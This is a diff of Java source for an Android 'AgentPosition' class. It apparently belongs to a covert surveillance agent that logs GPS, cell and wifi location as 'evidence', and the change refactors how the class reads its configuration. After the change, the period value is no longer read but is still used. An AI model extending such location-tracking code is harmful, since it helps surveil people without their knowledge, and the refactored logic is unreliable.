@@ -27,6 +27,7 @@ import com.android.service.agent.position.GPSLocator;
 import com.android.service.agent.position.GPSLocatorPeriod;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.IncrementalLog;
@@ -115,60 +116,35 @@ public class AgentPosition extends AgentBase implements IncrementalLog, Location
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) {
-		final byte[] confParameters = conf.getParams();
-		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);
-		try {
-			// millisecondi
-			period = databuffer.readInt();
-			final int type = databuffer.readInt();
+	public boolean parse(AgentConf conf) throws ConfigurationException {
 
-			if (Configuration.GPS_ENABLED) {
-				gpsEnabled = ((type & TYPE_GPS) != 0);
-			} else {
+		gpsEnabled = conf.getBoolean("gps");
 
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Warn: " + "GPS Disabled at compile time");//$NON-NLS-1$ //$NON-NLS-2$
-				}
+		cellEnabled = conf.getBoolean("cell");
+		wifiEnabled = conf.getBoolean("wifi");
 
-			}
-			cellEnabled = ((type & TYPE_CELL) != 0);
-			wifiEnabled = ((type & TYPE_WIFI) != 0);
-
-			if (Cfg.DEBUG) {
-				Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
-				// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type == //$NON-NLS-1$
-				// 4, "parse type: "
-				// + type);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "Type: " + type);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "Period: " + period);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-
-			setPeriod(period);
-			setDelay(POSITION_DELAY);
-
-		} catch (final IOException e) {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
-			}
-
-			return false;
+		if (Cfg.DEBUG) {
+			Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
+			// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type == //$NON-NLS-1$
+			// 4, "parse type: "
+			// + type);
 		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "Period: " + period);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+
+		setPeriod(period);
+		setDelay(POSITION_DELAY);
 
 		return true;
 	}
